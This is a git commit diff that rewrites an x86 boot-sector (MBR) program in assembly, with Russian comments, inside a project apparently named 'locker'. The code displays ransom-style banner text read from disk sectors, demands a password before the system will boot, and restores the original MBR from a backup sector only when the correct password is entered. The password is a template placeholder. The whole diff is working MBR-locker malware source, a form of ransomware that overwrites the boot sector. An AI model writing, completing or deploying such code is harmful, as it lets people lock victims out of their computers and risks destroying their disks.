1eee0b3f33a58c03343cec36e1ca5b94a475efb5
Virusodel <134794046+Virusodel@users.noreply.github.com>
2026-08-13 22:29:04 +0300

    mbr.asm

--- locker/mbr.asm
+++ locker/mbr.asm
@@ -11,25 +11,155 @@ start:
     mov sp, 0x7C00
     sti
 
-    ; Загружаем Stage2 из сектора 13 (1 сектор)
+    ; ============================================================
+    ; ВЕСЬ КОД ЗАГРУЗЧИКА ВСТРОЕН В MBR
+    ; ============================================================
+
+    ; Установка видеорежима
+    mov ax, 0x0003
+    int 0x10
+
+    ; Очистка экрана
+    mov ah, 0x06
+    mov al, 0
+    mov bh, 0x00
+    mov cx, 0
+    mov dx, 0x184F
+    int 0x10
+
+    ; ============================================================
+    ; ЗАГРУЗКА ШРИФТА (СЕКТОРЫ 3-4)
+    ; ============================================================
     mov ax, 0x0000
     mov es, ax
-    mov bx, 0x8000
+    mov bx, 0x1000
     mov ah, 0x02
-    mov al, 1               ; ТОЛЬКО 1 СЕКТОР
+    mov al, 2
     mov ch, 0
-    mov cl, 13              ; Сектор 13
+    mov cl, 3
     mov dh, 0
     mov dl, 0x80
     int 0x13
     jc load_error
 
-    jmp 0x0000:0x8000
+    ; ЗАГРУЗКА ШРИФТА В BIOS
+    mov ax, 0x1100
+    mov bx, 0x0100
+    int 0x10
+
+    ; Установка цвета (белый)
+    mov ax, 0x0F00
+    int 0x10
+
+    ; ============================================================
+    ; ЗАГРУЗКА И ВЫВОД ЗАГОЛОВКА (СЕКТОР 5)
+    ; ============================================================
+    mov ax, 0x0000
+    mov es, ax
+    mov bx, 0x9000
+    mov ah, 0x02
+    mov al, 1
+    mov ch, 0
+    mov cl, 5
+    mov dh, 0
+    mov dl, 0x80
+    int 0x13
+    jc load_error
+
+    mov si, 0x9000
+    call print
+
+    ; ============================================================
+    ; ЗАГРУЗКА И ВЫВОД ТЕКСТА (СЕКТОР 6)
+    ; ============================================================
+    mov ax, 0x0000
+    mov es, ax
+    mov bx, 0x9200
+    mov ah, 0x02
+    mov al, 1
+    mov ch, 0
+    mov cl, 6
+    mov dh, 0
+    mov dl, 0x80
+    int 0x13
+    jc load_error
+
+    mov si, 0x9200
+    call print
+
+    ; ============================================================
+    ; КУРСОР В ЛЕВЫЙ НИЖНИЙ УГОЛ И ВЫВОД PASSWORD
+    ; ============================================================
+    mov ah, 0x02
+    mov bh, 0
+    mov dh, 24
+    mov dl, 0
+    int 0x10
+
+    mov si, msg_prompt
+    call print
+
+password_loop:
+    call get_password
+    call check_password
+    cmp byte [password_ok], 1
+    je restore_and_boot
+    
+    mov si, msg_wrong
+    call print
+    jmp password_loop
 
 load_error:
     mov si, msg_error
     call print
     jmp hang
+
+restore_and_boot:
+    call restore_mbr
+    jmp load_os
+
+restore_mbr:
+    pusha
+    ; Читаем оригинал из сектора 2
+    mov ax, 0x0000
+    mov es, ax
+    mov bx, 0x7E00
+    mov ah, 0x02
+    mov al, 1
+    mov ch, 0
+    mov cl, 2
+    mov dh, 0
+    mov dl, 0x80
+    int 0x13
+    jc .error
+
+    ; Записываем в сектор 0
+    mov ax, 0x0000
+    mov es, ax
+    mov bx, 0x7E00
+    mov ah, 0x03
+    mov al, 1
+    mov ch, 0
+    mov cl, 1
+    mov dh, 0
+    mov dl, 0x80
+    int 0x13
+.error:
+    popa
+    ret
+
+load_os:
+    mov ax, 0x0000
+    mov es, ax
+    mov bx, 0x7C00
+    mov ah, 0x02
+    mov al, 1
+    mov ch, 0
+    mov cl, 1
+    mov dh, 0
+    mov dl, 0x80
+    int 0x13
+    jmp 0x0000:0x7C00
 
 print:
     lodsb
@@ -41,13 +171,86 @@ print:
 .done:
     ret
 
+get_password:
+    mov di, buffer
+    mov cx, 64
+.loop:
+    xor ax, ax
+    int 0x16
+    cmp al, 0x0D
+    je .done
+    cmp al, 0x08
+    je .backspace
+    cmp al, 0x7F
+    je .backspace
+    cmp di, buffer + 64
+    je .loop
+    stosb
+    mov ah, 0x0E
+    mov al, [di - 1]
+    int 0x10
+    jmp .loop
+.backspace:
+    cmp di, buffer
+    je .loop
+    dec di
+    mov ah, 0x0E
+    mov al, 0x08
+    int 0x10
+    mov al, ' '
+    int 0x10
+    mov al, 0x08
+    int 0x10
+    jmp .loop
+.done:
+    mov byte [di], 0
+    mov ah, 0x0E
+    mov al, 0x0A
+    int 0x10
+    mov al, 0x0D
+    int 0x10
+    ret
+
+check_password:
+    mov si, buffer
+    mov di, password
+.compare:
+    lodsb
+    or al, al
+    jz .check_end
+    cmpsb
+    jne .fail
+    jmp .compare
+.check_end:
+    cmp byte [di], 0
+    jne .fail
+    mov byte [password_ok], 1
+.fail:
+    ret
+
 hang:
     cli
     hlt
     jmp hang
 
+; ===== ДАННЫЕ =====
+msg_prompt:
+    db 'Password: ',0
+
+msg_wrong:
+    db 13,10,'Wrong password!',13,10,0
+
 msg_error:
-    db 'Load error!', 0
+    db 'Load error!',0
+
+password:
+    db {PASSWORD_HEX}
+
+buffer:
+    times 64 db 0
+
+password_ok:
+    db 0
 
 times 510 - ($ - $$) db 0
 dw 0xAA55
